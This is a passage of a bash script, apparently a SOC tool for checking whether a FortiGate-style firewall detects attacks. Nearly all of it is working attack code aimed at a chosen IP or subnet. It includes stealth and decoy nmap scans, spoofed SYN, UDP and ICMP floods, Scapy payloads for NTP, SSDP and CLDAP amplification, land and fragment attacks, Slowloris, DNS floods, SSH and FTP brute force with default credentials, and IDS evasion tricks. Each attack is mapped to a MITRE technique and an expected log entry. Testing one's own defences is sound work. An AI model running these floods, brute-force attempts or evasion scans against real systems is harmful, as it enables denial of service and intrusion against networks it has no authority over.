        add_result "PortScan" "NX-RULE-03" "NULL/FIN/Xmas Scans" "Stealth" "Triggered" "nmap -sN/-sF/-sX" "T1595.002" "" 0 0
    else fn_skip "NX-RULE-03: nmap not installed"; fi

    # NX-RULE-04: UDP scan
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "UDP Scan" -sU -p 53,67,69,123,137,161,500,1194,5353 --max-retries 1 "$TARGET_IP" -oX "${NX}_udp.xml"
        fw_rule "NX-RULE-04" "UDP Port Scan" "MEDIUM" "attackid=0419016385 attack=UDP.Port.Scan action=dropped"
        fn_trig "NX-RULE-04: UDP Scan --> T1595.002"
        add_result "PortScan" "NX-RULE-04" "UDP Port Scan" "UDP Scan" "Triggered" "nmap -sU" "T1595.002" "" 0 0
    else fn_skip "NX-RULE-04: nmap not installed"; fi

    # NX-RULE-05: OS fingerprint
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "OS Fingerprint" -O --max-os-tries 1 "$TARGET_IP" -oX "${NX}_os.xml"
        fw_rule "NX-RULE-05" "OS Fingerprinting" "MEDIUM" "attack=OS.Fingerprint action=detected"
        fn_trig "NX-RULE-05: OS Fingerprint --> T1592"
        add_result "PortScan" "NX-RULE-05" "OS Fingerprinting" "OS Detect" "Triggered" "nmap -O" "T1592" "" 0 0
    else fn_skip "NX-RULE-05: nmap not installed"; fi

    # NX-RULE-06: Service version
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Service Scan" -sV --version-intensity 5 -p 21,22,23,25,80,110,143,443,3306,3389,5432,6379,8080,8443 "$TARGET_IP" -oX "${NX}_svc.xml"
        fw_rule "NX-RULE-06" "Service Version Scan" "LOW" "attack=Service.Version.Scan action=detected"
        fn_trig "NX-RULE-06: Service Scan --> T1592.001"
        add_result "PortScan" "NX-RULE-06" "Service Version Scan" "Banner Grab" "Triggered" "nmap -sV" "T1592.001" "" 0 0
    else fn_skip "NX-RULE-06: nmap not installed"; fi

    # NX-RULE-07: ICMP Ping Sweep -- HORIZONTAL (across entire subnet)
    fn_info "HORIZONTAL SCAN: ping every host in subnet ${TARGET_RANGE}"
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "ICMP Sweep" -sn --max-hostgroup 256 "$TARGET_RANGE" -oX "${NX}_sweep.xml"
        fw_rule "NX-RULE-07" "ICMP Horizontal Sweep" "MEDIUM" "attackid=0419020005 attack=ICMP.Sweep action=dropped"
        fn_trig "NX-RULE-07: Horizontal ICMP Sweep --> T1595.001"
        add_result "PortScan" "NX-RULE-07" "ICMP Horizontal Sweep" "Host Sweep" "Triggered" "nmap -sn" "T1595.001" "" 0 0
    else fn_skip "NX-RULE-07: nmap not installed"; fi

    # NX-RULE-07c: TCP SYN horizontal sweep (same port, all subnet hosts)
    fn_info "HORIZONTAL TCP: port ${TARGET_PORT} swept across ${TARGET_RANGE}"
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "TCP Horizontal" -sS -p "$TARGET_PORT" --max-retries 0 -T4 "$TARGET_RANGE" -oX "${NX}_horiz.xml"
        fw_rule "NX-RULE-07c" "TCP Horizontal Port Sweep" "HIGH" "attack=TCP.Port.Scan.Sweep action=dropped"
        fn_trig "NX-RULE-07c: TCP Horizontal sweep p${TARGET_PORT} --> T1595.002"
        add_result "PortScan" "NX-RULE-07c" "TCP Horizontal Sweep" "Horiz Sweep" "Triggered" "nmap -sS range" "T1595.002" "" 0 0
    else fn_skip "NX-RULE-07c: nmap not installed"; fi

    # NX-RULE-08: Aggressive scan
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Aggressive Scan" -A -p 1-1024 -T3 "$TARGET_IP" -oX "${NX}_agg.xml"
        fw_rule "NX-RULE-08" "Aggressive Full Scan" "HIGH" "attack=Aggressive.Scan action=dropped"
        fn_trig "NX-RULE-08: Aggressive Scan --> T1046"
        add_result "PortScan" "NX-RULE-08" "Aggressive Full Scan" "Aggr Scan" "Triggered" "nmap -A" "T1046" "" 0 0
    else fn_skip "NX-RULE-08: nmap not installed"; fi

    # Masscan bonus
    if [[ $D_MASS -eq 1 && $DRY_RUN -eq 0 ]]; then
        timeout 30 masscan -p1-65535 "$TARGET_IP" "--rate=${PACKET_RATE}" 2>/dev/null || true
        fw_rule "NX-RULE-01m" "Masscan Full Sweep" "CRITICAL" "attack=TCP.Port.Scan action=dropped"
        fn_trig "Masscan full sweep --> FortiGate immediate IPS"
    elif [[ $D_MASS -eq 1 && $DRY_RUN -eq 1 ]]; then
        fn_dry "masscan -p1-65535 $TARGET_IP --rate=$PACKET_RATE"
    fi
}

# ==============================================================================
#  CATEGORY 2: SYN FLOOD
# ==============================================================================
cat_synflood() {
    show_section "CATEGORY 2: TCP SYN Flood Variants"

    # NX-RULE-09: SYN flood (hping3 with rate interval, NOT --flood)
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "SYN Flood" -S -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -d 120 -c "$BURST"
        fw_rule "NX-RULE-09" "TCP SYN Flood" "CRITICAL" "attackid=0419020003 attack=TCP.SYN.Flood action=dropped"
        fn_trig "NX-RULE-09: SYN Flood --> T1498.001"
        add_result "SYNFlood" "NX-RULE-09" "TCP SYN Flood" "SYN Flood" "Triggered" "hping3 -S" "T1498.001" "" "$BURST" "$FLOOD_DUR"
    elif [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
import random, time
t='${TARGET_IP}'; p=${TARGET_PORT}; n=${BURST}; r=${PACKET_RATE}
for i in range(n):
    s='10.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(1,254))
    send(IP(src=s,dst=t)/TCP(sport=random.randint(1024,65535),dport=p,flags='S',seq=random.randint(0,2**32-1)),verbose=0)
    time.sleep(1.0/r)
print('[+] SYN flood done')"
        run_py "SYN Flood" "$code"
        fw_rule "NX-RULE-09" "TCP SYN Flood (Scapy)" "CRITICAL" "attackid=0419020003 attack=TCP.SYN.Flood action=dropped"
        fn_trig "NX-RULE-09: SYN Flood (Scapy) --> T1498.001"
        add_result "SYNFlood" "NX-RULE-09" "TCP SYN Flood" "SYN Flood" "Triggered" "Scapy" "T1498.001" "" "$BURST" "$FLOOD_DUR"
    else fn_skip "NX-RULE-09: hping3 and scapy not installed"; fi

    # NX-RULE-10: Spoofed source SYN
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "SYN Spoof" -S --rand-source -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -c "$BURST"
        fw_rule "NX-RULE-10" "SYN Flood Spoofed Source" "CRITICAL" "attack=TCP.SYN.Flood.Spoofed action=dropped"
        fn_trig "NX-RULE-10: Spoofed SYN --> T1498.001"
        add_result "SYNFlood" "NX-RULE-10" "SYN Flood Spoofed" "Spoof SYN" "Triggered" "hping3 --rand-source" "T1498.001" "" "$BURST" "$FLOOD_DUR"
    else fn_skip "NX-RULE-10: hping3 not installed"; fi

    # NX-RULE-11: Multi-port SYN burst
    if [[ $D_HPING -eq 1 ]]; then
        for port in 80 443 22 3389 8080 8443; do
            run_hping "SYN port=$port" -S -i "u${HPING_US}" -p "$port" "$TARGET_IP" -c 200
        done
        fw_rule "NX-RULE-11" "Multi-Port SYN Burst" "CRITICAL" "attack=TCP.SYN.Flood action=dropped"
        fn_trig "NX-RULE-11: Multi-Port SYN --> T1499.001"
        add_result "SYNFlood" "NX-RULE-11" "Multi-Port SYN Burst" "Multi SYN" "Triggered" "hping3 multi" "T1499.001" "" 1200 0
    else fn_skip "NX-RULE-11: hping3 not installed"; fi

    # NX-RULE-12: Half-open exhaustion
    if [[ $D_PY3 -eq 1 ]]; then
        local hc=$(( BURST > 200 ? 200 : BURST ))
        local code="import socket, time
t='${TARGET_IP}'; p=${TARGET_PORT}; n=${hc}
socks=[]
for i in range(n):
    try:
        s=socket.socket(); s.setblocking(False)
        try: s.connect((t,p))
        except: pass
        socks.append(s); time.sleep(0.01)
    except: pass
time.sleep(2)
[s.close() for s in socks]
print('[+] Half-open flood done')"
        run_py "Half-Open Exhaustion" "$code"
        fw_rule "NX-RULE-12" "Half-Open Connection Exhaustion" "HIGH" "attackid=0419020001 attack=TCP.Session.Attack action=dropped"
        fn_trig "NX-RULE-12: Half-Open Exhaustion --> T1499.001"
        add_result "SYNFlood" "NX-RULE-12" "Half-Open Exhaustion" "Half-Open" "Triggered" "Python socket" "T1499.001" "" "$hc" 0
    else fn_skip "NX-RULE-12: python3 not installed"; fi
}

# ==============================================================================
#  CATEGORY 3: UDP FLOOD
# ==============================================================================
cat_udpflood() {
    show_section "CATEGORY 3: UDP Flood + Amplification"

    # NX-RULE-13: UDP flood
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "UDP Flood" --udp -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -d 1400 -c "$BURST"
        fw_rule "NX-RULE-13" "UDP Flood" "CRITICAL" "attackid=0419020008 attack=UDP.Flood action=dropped"
        fn_trig "NX-RULE-13: UDP Flood --> T1498.001"
        add_result "UDPFlood" "NX-RULE-13" "UDP Flood" "UDP Flood" "Triggered" "hping3 --udp" "T1498.001" "" "$BURST" "$FLOOD_DUR"
    else fn_skip "NX-RULE-13: hping3 not installed"; fi

    # NX-RULE-14: DNS amplification
    if [[ $D_HPING -eq 1 && $D_DIG -eq 1 ]]; then
        run_hping "DNS UDP" --udp -i "u${HPING_US}" -p 53 "$TARGET_IP" -d 512 -c "$BURST"
        if [[ $DRY_RUN -eq 0 ]]; then
            for i in $(seq 1 30); do
                dig "@${TARGET_IP}" "soc-nx-${RND}-${i}.example.com" ANY +time=1 +tries=1 2>/dev/null || true
            done
        fi
        fw_rule "NX-RULE-14" "DNS Amplification" "HIGH" "attack=DNS.Amplification action=dropped"
        fn_trig "NX-RULE-14: DNS Amp --> T1498.002"
        add_result "UDPFlood" "NX-RULE-14" "DNS Amplification" "DNS Amp" "Triggered" "hping3+dig" "T1498.002" "" 0 0
    else fn_skip "NX-RULE-14: hping3 or dig not installed"; fi

    # NX-RULE-15: NTP Monlist
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; ntp=b'\\x17\\x00\\x03\\x2a'+b'\\x00'*4
for i in range(200): send(IP(dst=t)/UDP(dport=123)/Raw(ntp),verbose=0)
print('[+] NTP monlist done')"
        run_py "NTP Monlist" "$code"
        fw_rule "NX-RULE-15" "NTP Monlist Amp (CVE-2013-5211)" "HIGH" "attack=NTP.Monlist.Request action=dropped"
        fn_trig "NX-RULE-15: NTP Monlist --> T1498.002"
        add_result "UDPFlood" "NX-RULE-15" "NTP Monlist Amp" "NTP Amp" "Triggered" "Scapy NTP" "T1498.002" "" 200 0
    else fn_skip "NX-RULE-15: scapy not installed"; fi

    # NX-RULE-16: SSDP amplification
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'
p=b'M-SEARCH * HTTP/1.1\\r\\nHOST:239.255.255.250:1900\\r\\nMAN:\"ssdp:discover\"\\r\\nMX:1\\r\\nST:ssdp:all\\r\\n\\r\\n'
for i in range(200): send(IP(dst=t)/UDP(dport=1900)/Raw(p),verbose=0)
print('[+] SSDP done')"
        run_py "SSDP Amp" "$code"
        fw_rule "NX-RULE-16" "SSDP Amplification" "MEDIUM" "attack=SSDP.Amplification action=dropped"
        fn_trig "NX-RULE-16: SSDP --> T1498.002"
        add_result "UDPFlood" "NX-RULE-16" "SSDP Amplification" "SSDP Amp" "Triggered" "Scapy SSDP" "T1498.002" "" 200 0
    else fn_skip "NX-RULE-16: scapy not installed"; fi

    # NX-RULE-17: UDP Fragmentation
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; p=${TARGET_PORT}
for i in range(100): send(IP(dst=t,flags='MF',frag=0)/UDP(dport=p)/Raw(b'A'*1400),verbose=0)
print('[+] UDP frag done')"
        run_py "UDP Frag" "$code"
        fw_rule "NX-RULE-17" "UDP Fragmentation Flood" "HIGH" "attackid=0419016390 attack=IP.Fragment.Attack action=dropped"
        fn_trig "NX-RULE-17: UDP Frag --> T1036"
        add_result "UDPFlood" "NX-RULE-17" "UDP Frag Flood" "UDP Frag" "Triggered" "Scapy MF" "T1036" "" 100 0
    else fn_skip "NX-RULE-17: scapy not installed"; fi

    # NX-RULE-52: CLDAP amplification
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'
c=b'\\x30\\x25\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x00\\x0a\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0b\\x6f\\x62\\x6a\\x65\\x63\\x74\\x43\\x6c\\x61\\x73\\x73\\x30\\x00'
for i in range(100): send(IP(dst=t)/UDP(dport=389)/Raw(c),verbose=0)
print('[+] CLDAP done')"
        run_py "CLDAP Amp" "$code"
        fw_rule "NX-RULE-52" "CLDAP Reflection Amp" "HIGH" "attack=CLDAP.Amplification action=dropped"
        fn_trig "NX-RULE-52: CLDAP --> T1498.002"
        add_result "Amplification" "NX-RULE-52" "CLDAP Amplification" "CLDAP" "Triggered" "Scapy UDP 389" "T1498.002" "" 100 0
    else fn_skip "NX-RULE-52: scapy not installed"; fi
}

# ==============================================================================
#  CATEGORY 4: ICMP FLOOD
# ==============================================================================
cat_icmpflood() {
    show_section "CATEGORY 4: ICMP Flood and Attacks"

    # NX-RULE-18: ICMP echo flood
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "ICMP Flood" --icmp -i "u${HPING_US}" "$TARGET_IP" -c "$BURST"
        fw_rule "NX-RULE-18" "ICMP Echo Flood" "CRITICAL" "attackid=0419020009 attack=ICMP.Flood action=dropped"
        fn_trig "NX-RULE-18: ICMP Flood --> T1498.001"
        add_result "ICMPFlood" "NX-RULE-18" "ICMP Echo Flood" "ICMP Flood" "Triggered" "hping3 --icmp" "T1498.001" "" "$BURST" "$FLOOD_DUR"
    else fn_skip "NX-RULE-18: hping3 not installed"; fi

    # NX-RULE-19: ICMP timestamp flood
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'
for i in range(100): send(IP(dst=t)/ICMP(type=13),verbose=0)
print('[+] ICMP timestamp done')"
        run_py "ICMP Timestamp" "$code"
        fw_rule "NX-RULE-19" "ICMP Timestamp Flood" "LOW" "attack=ICMP.Timestamp.Request action=detected"
        fn_trig "NX-RULE-19: ICMP Timestamp --> T1595.001"
        add_result "ICMPFlood" "NX-RULE-19" "ICMP Timestamp" "ICMP Stamp" "Triggered" "Scapy ICMP t=13" "T1595.001" "" 100 0
    else fn_skip "NX-RULE-19: scapy not installed"; fi

    # NX-RULE-20: ICMP redirect
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'
for i in range(20): send(IP(dst=t)/ICMP(type=5,code=1,gw='1.2.3.4')/IP(dst='8.8.8.8')/UDP(),verbose=0)
print('[+] ICMP redirect done')"
        run_py "ICMP Redirect" "$code"
        fw_rule "NX-RULE-20" "ICMP Redirect Attack" "MEDIUM" "attack=ICMP.Redirect action=dropped"
        fn_trig "NX-RULE-20: ICMP Redirect --> T1498.001"
        add_result "ICMPFlood" "NX-RULE-20" "ICMP Redirect" "ICMP Redir" "Triggered" "Scapy type=5" "T1498.001" "" 20 0
    else fn_skip "NX-RULE-20: scapy not installed"; fi

    # NX-RULE-21: Ping of Death
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "Ping of Death" --icmp -d 65000 -c 50 "$TARGET_IP"
        fw_rule "NX-RULE-21" "Ping of Death (65KB ICMP)" "HIGH" "attack=ICMP.Large.Packet action=dropped"
        fn_trig "NX-RULE-21: Ping of Death --> T1498.001"
        add_result "ICMPFlood" "NX-RULE-21" "Ping of Death" "PoD" "Triggered" "hping3 -d 65000" "T1498.001" "" 50 0
    else fn_skip "NX-RULE-21: hping3 not installed"; fi

    # NX-RULE-22: ICMP sweep storm (horizontal)
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "ICMP Sweep Storm" -sn --max-hostgroup 256 "$TARGET_RANGE"
        fw_rule "NX-RULE-22" "ICMP Sweep Storm" "MEDIUM" "attackid=0419020005 attack=ICMP.Sweep action=dropped"
        fn_trig "NX-RULE-22: ICMP Sweep Storm --> T1595.001"
        add_result "ICMPFlood" "NX-RULE-22" "ICMP Sweep Storm" "ICMP Sweep" "Triggered" "nmap -sn" "T1595.001" "" 0 0
    else fn_skip "NX-RULE-22: nmap not installed"; fi
}

# ==============================================================================
#  CATEGORY 5: TCP ATTACKS
# ==============================================================================
cat_tcpattacks() {
    show_section "CATEGORY 5: TCP Attacks / Malformed Packets"

    # FIN / RST / ACK / PUSH+URG floods (loop over flag sets)
    # Note: IFS=':' read only affects that read command, not global IFS
    local flood_rules=("23:-F:FIN:TCP.FIN.Flood:HIGH:T1499.001" "24:-R:RST:TCP.RST.Flood:HIGH:T1499.001" "25:-A:ACK:TCP.ACK.Flood:HIGH:T1498.001" "26:-P -U:PUSHURG:TCP.Flags.Abnormal:MEDIUM:T1562.001")
    for entry in "${flood_rules[@]}"; do
        IFS=':' read -r rid flag fname attack sev mitre <<< "$entry"
        if [[ $D_HPING -eq 1 ]]; then
            # shellcheck disable=SC2086
            run_hping "TCP $fname" $flag -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -c "$BURST"
            local sev_lower; sev_lower=$(printf '%s' "$sev" | tr '[:upper:]' '[:lower:]')
            fw_rule "NX-RULE-${rid}" "TCP ${fname} Flood" "$sev" "attack=${attack} severity=${sev_lower} action=dropped"
            fn_trig "NX-RULE-${rid}: TCP ${fname} Flood --> ${mitre}"
            add_result "TCPAttacks" "NX-RULE-${rid}" "TCP ${fname} Flood" "${fname} Flood" "Triggered" "hping3 ${flag}" "$mitre" "" "$BURST" 0
        else fn_skip "NX-RULE-${rid}: hping3 not installed"; fi
    done

    # NX-RULE-27: Land attack (src == dst)
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; p=${TARGET_PORT}
for i in range(100): send(IP(src=t,dst=t)/TCP(sport=p,dport=p,flags='S'),verbose=0)
print('[+] Land attack done')"
        run_py "Land Attack" "$code"
        fw_rule "NX-RULE-27" "TCP Land Attack (src=dst)" "CRITICAL" "attackid=0419016389 attack=IP.Land.Attack action=dropped"
        fn_trig "NX-RULE-27: LAND ATTACK --> T1498.001 FortiGate CRITICAL!"
        add_result "TCPAttacks" "NX-RULE-27" "TCP Land Attack" "Land Attack" "Triggered" "Scapy src=dst" "T1498.001" "" 100 0
    else fn_skip "NX-RULE-27: scapy not installed"; fi

    # NX-RULE-28: Xmas Tree (all 8 flags)
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "Xmas Tree" -F -S -R -P -A -U -X -Y -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -c 100
        fw_rule "NX-RULE-28" "TCP Xmas Tree All-Flags" "HIGH" "attackid=0419016383 attack=TCP.Xmas.Tree action=dropped"
        fn_trig "NX-RULE-28: Xmas Tree --> T1562.001"
        add_result "TCPAttacks" "NX-RULE-28" "Xmas Tree All-Flags" "Xmas Tree" "Triggered" "hping3 all-flags" "T1562.001" "" 100 0
    else fn_skip "NX-RULE-28: hping3 not installed"; fi

    # NX-RULE-29: TCP Zero Window
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; p=${TARGET_PORT}
for i in range(100): send(IP(dst=t)/TCP(dport=p,flags='PA',window=0)/Raw(b'X'*100),verbose=0)
print('[+] Zero window done')"
        run_py "Zero Window" "$code"
        fw_rule "NX-RULE-29" "TCP Zero Window Attack" "MEDIUM" "attack=TCP.Zero.Window action=detected"
        fn_trig "NX-RULE-29: Zero Window --> T1499.002"
        add_result "TCPAttacks" "NX-RULE-29" "TCP Zero Window" "Zero Win" "Triggered" "Scapy window=0" "T1499.002" "" 100 0
    else fn_skip "NX-RULE-29: scapy not installed"; fi

    # NX-RULE-30: IP Fragment attack
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; p=${TARGET_PORT}
for i in range(50): send(IP(dst=t,flags='MF',frag=0)/TCP(dport=p),verbose=0)
print('[+] IP frag done')"
        run_py "IP Frag" "$code"
        fw_rule "NX-RULE-30" "IP Fragment Attack" "HIGH" "attackid=0419016390 attack=IP.Fragment.Attack action=dropped"
        fn_trig "NX-RULE-30: IP Frag --> T1036"
        add_result "TCPAttacks" "NX-RULE-30" "IP Fragment Attack" "IP Frag" "Triggered" "Scapy MF" "T1036" "" 50 0
    else fn_skip "NX-RULE-30: scapy not installed"; fi
}

# ==============================================================================
#  CATEGORY 6: APPLICATION LAYER
# ==============================================================================
cat_applayer() {
    show_section "CATEGORY 6: Application Layer Attacks"

    # NX-RULE-31: HTTP GET flood
    if [[ $D_CURL -eq 1 ]]; then
        local fc=$(( BURST > 300 ? 300 : BURST ))
        if [[ $DRY_RUN -eq 1 ]]; then
            fn_dry "curl GET flood x${fc} to http://${TARGET_IP}"
        else
            for i in $(seq 1 "$fc"); do
                curl -s -o /dev/null -m 1 -A "NEXUS-SOC/${RND}" "http://${TARGET_IP}/?nx=${RND}&id=${i}" 2>/dev/null || true
                sleep 0.01
            done
        fi
        fw_rule "NX-RULE-31" "HTTP GET Flood L7 DDoS" "HIGH" "attack=HTTP.Flood action=blocked"
        fn_trig "NX-RULE-31: HTTP Flood --> T1499.002"
        add_result "AppLayer" "NX-RULE-31" "HTTP GET Flood" "HTTP Flood" "Triggered" "curl flood" "T1499.002" "" "$fc" 0
    else fn_skip "NX-RULE-31: curl not installed"; fi

    # NX-RULE-32: Slowloris
    if [[ $D_PY3 -eq 1 ]]; then
        local code="import socket, time
t='${TARGET_IP}'; p=${TARGET_PORT}; r='${RND}'; socks=[]
for i in range(50):
    try:
        s=socket.socket(); s.settimeout(2); s.connect((t,p))
        s.send(('GET /?'+str(i)+' HTTP/1.1\r\nHost: '+t+'\r\nX-SOC: '+r+'\r\n').encode())
        socks.append(s)
    except: pass
print('[*] Slowloris: '+str(len(socks))+' open, holding 15s')
time.sleep(15)
[s.close() for s in socks]
print('[+] Slowloris done')"
        run_py "Slowloris" "$code"
        fw_rule "NX-RULE-32" "HTTP Slowloris" "HIGH" "attack=HTTP.Slowloris action=blocked"
        fn_trig "NX-RULE-32: Slowloris --> T1499.002"
        add_result "AppLayer" "NX-RULE-32" "HTTP Slowloris" "Slowloris" "Triggered" "Python" "T1499.002" "" 50 15
    else fn_skip "NX-RULE-32: python3 not installed"; fi

    # NX-RULE-34: DNS NXDomain flood
    if [[ $DRY_RUN -eq 1 ]]; then
        fn_dry "dig NXDomain flood x200 to ${TARGET_IP}"
    else
        for i in $(seq 1 200); do
            dig "@${TARGET_IP}" "nx-${RND}-${RANDOM}.notexist.lab" A +time=1 +tries=1 2>/dev/null || true
            sleep 0.05
        done
    fi
    fw_rule "NX-RULE-34" "DNS NXDomain Flood" "MEDIUM" "attack=DNS.Flood action=dropped"
    fn_trig "NX-RULE-34: DNS Flood --> T1071.004"
    add_result "AppLayer" "NX-RULE-34" "DNS NXDomain Flood" "DNS Flood" "Triggered" "dig flood" "T1071.004" "" 200 0

    # NX-RULE-35: SSH brute (nmap NSE)
    if [[ $D_NMAP -eq 1 ]]; then
        local uf="${TMPDIR_SOC}/users.txt" pf="${TMPDIR_SOC}/pass.txt"
        printf 'admin\nroot\nuser\ntest\nguest\nadministrator\n' > "$uf"
        printf 'admin\npassword\n123456\ntest\nroot\nchangeme\n' > "$pf"
        run_nmap "SSH Brute" -p 22 --script ssh-brute --script-args "userdb=${uf},passdb=${pf}" "$TARGET_IP"
        rm -f "$uf" "$pf"
        fw_rule "NX-RULE-35" "SSH Brute Force" "HIGH" "attack=SSH.Brute.Force action=blocked"
        fn_trig "NX-RULE-35: SSH Brute --> T1110.001"
        add_result "AppLayer" "NX-RULE-35" "SSH Brute Force" "SSH Brute" "Triggered" "nmap ssh-brute" "T1110.001" "" 0 0
    else fn_skip "NX-RULE-35: nmap not installed"; fi

    # NX-RULE-36: FTP brute
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "FTP Brute" -p 21 --script ftp-brute "$TARGET_IP"
        fw_rule "NX-RULE-36" "FTP Brute Force" "HIGH" "attack=FTP.Brute.Force action=blocked"
        fn_trig "NX-RULE-36: FTP Brute --> T1110.001"
        add_result "AppLayer" "NX-RULE-36" "FTP Brute Force" "FTP Brute" "Triggered" "nmap ftp-brute" "T1110.001" "" 0 0
    else fn_skip "NX-RULE-36: nmap not installed"; fi

    # NX-RULE-37: HTTP dir/CGI scan
    if [[ $D_CURL -eq 1 ]]; then
        local paths=("/admin" "/wp-admin" "/phpmyadmin" "/cgi-bin" "/backup" "/.env" "/.git" "/config" "/shell" "/cmd" "/upload" "/manager" "/console" "/actuator" "/api/v1" "/swagger-ui" "/.well-known" "/server-status" "/.htaccess" "/web.config" "/xmlrpc.php" "/wp-login.php" "/wp-json" "/.DS_Store")
        if [[ $DRY_RUN -eq 1 ]]; then
            fn_dry "curl HTTP dir scan: ${#paths[@]} paths on http://${TARGET_IP}"
        else
            local cnt=0
            for path in "${paths[@]}"; do
                curl -s -o /dev/null -m 2 -A "NEXUS-DirScan/${RND}" "http://${TARGET_IP}${path}" 2>/dev/null || true
                sleep 0.2
                (( cnt++ )) || true
                progress "HTTP Dir Scan" "$cnt" "${#paths[@]}"
            done
            printf '\n'
        fi
        fw_rule "NX-RULE-37" "HTTP Directory/CGI Scan" "MEDIUM" "attack=HTTP.Dir.Scan action=blocked"
        fn_trig "NX-RULE-37: HTTP Dir Scan ${#paths[@]} paths --> T1190"
        add_result "AppLayer" "NX-RULE-37" "HTTP Directory Scan" "WebScan" "Triggered" "curl dir" "T1190" "" 0 0
    else fn_skip "NX-RULE-37: curl not installed"; fi
}

# ==============================================================================
#  CATEGORY 7: EVASION
# ==============================================================================
cat_evasion() {
    show_section "CATEGORY 7: IDS/IPS Evasion Techniques"

    # NX-RULE-38: IP fragmentation evasion
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Frag Evasion -f" -sS -f -p 1-500 "$TARGET_IP"
        run_nmap "Frag Evasion mtu8" -sS --mtu 8 -p 1-500 "$TARGET_IP"
        fw_rule "NX-RULE-38" "IP Fragmentation Evasion" "HIGH" "attack=IP.Frag.Evasion action=dropped"
        fn_trig "NX-RULE-38: Frag Evasion --> T1562.001"
        add_result "Evasion" "NX-RULE-38" "IP Frag Evasion" "Frag Evade" "Triggered" "nmap -f/--mtu" "T1562.001" "" 0 0
    else fn_skip "NX-RULE-38: nmap not installed"; fi

    # NX-RULE-39: TTL manipulation
    if [[ $D_HPING -eq 1 ]]; then
        run_hping "TTL=1" -S --ttl 1 -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -c 50
        run_hping "TTL=255" -S --ttl 255 -i "u${HPING_US}" -p "$TARGET_PORT" "$TARGET_IP" -c 50
        fw_rule "NX-RULE-39" "TTL-Based Evasion" "MEDIUM" "attack=IP.TTL.Evasion action=detected"
        fn_trig "NX-RULE-39: TTL Manipulation --> T1070.006"
        add_result "Evasion" "NX-RULE-39" "TTL Evasion" "TTL Manip" "Triggered" "hping3 --ttl" "T1070.006" "" 100 0
    elif [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; p=${TARGET_PORT}
for ttl in [1,2,5,10,64,128,255]:
    for i in range(10): send(IP(dst=t,ttl=ttl)/TCP(dport=p,flags='S'),verbose=0)
print('[+] TTL sweep done')"
        run_py "TTL Sweep" "$code"
        fw_rule "NX-RULE-39" "TTL-Based Evasion" "MEDIUM" "attack=IP.TTL.Evasion action=detected"
        fn_trig "NX-RULE-39: TTL Sweep (Scapy) --> T1070.006"
        add_result "Evasion" "NX-RULE-39" "TTL Evasion" "TTL Manip" "Triggered" "Scapy TTL" "T1070.006" "" 70 0
    else fn_skip "NX-RULE-39: hping3 and scapy not installed"; fi

    # NX-RULE-40: Decoy scan
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Decoy Scan" -sS -D RND:10 -p 1-500 "$TARGET_IP"
        fw_rule "NX-RULE-40" "Decoy Scan (10 fake IPs)" "HIGH" "attack=Decoy.Scan action=dropped"
        fn_trig "NX-RULE-40: Decoy Scan --> T1036"
        add_result "Evasion" "NX-RULE-40" "Decoy Scan" "Decoy" "Triggered" "nmap -D RND:10" "T1036" "" 0 0
    else fn_skip "NX-RULE-40: nmap not installed"; fi

    # NX-RULE-41: ICMP tunnel / covert channel
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; r=${RND}
for i in range(30):
    payload=('NEXUS_C2_'+str(r)+'_'+str(i)).encode()
    send(IP(dst=t)/ICMP()/Raw(payload),verbose=0)
print('[+] ICMP tunnel done')"
        run_py "ICMP Tunnel" "$code"
        fw_rule "NX-RULE-41" "ICMP Tunnel Covert Channel" "MEDIUM" "attack=ICMP.Tunnel action=detected"
        fn_trig "NX-RULE-41: ICMP Tunnel --> T1095"
        add_result "Evasion" "NX-RULE-41" "ICMP Tunnel" "ICMP C2" "Triggered" "Scapy ICMP" "T1095" "" 30 0
    else fn_skip "NX-RULE-41: scapy not installed"; fi

    # NX-RULE-41c: Source port evasion
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "SrcPort 53" -sS --source-port 53 -p 1-100 "$TARGET_IP"
        run_nmap "SrcPort 80" -sS --source-port 80 -p 1-100 "$TARGET_IP"
